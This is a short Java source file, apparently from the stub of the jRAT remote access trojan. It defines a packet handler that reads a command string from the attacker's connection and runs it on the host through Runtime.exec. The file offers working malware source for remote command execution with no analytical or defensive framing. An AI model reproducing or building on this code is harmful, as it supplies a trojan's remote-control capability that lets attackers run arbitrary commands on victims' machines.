package pro.jrat.stub.packets.incoming;

import pro.jrat.stub.Connection;

public class Packet38RunCommand extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String process = Connection.readLine();
		try {
			Runtime.getRuntime().exec(process);
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

}
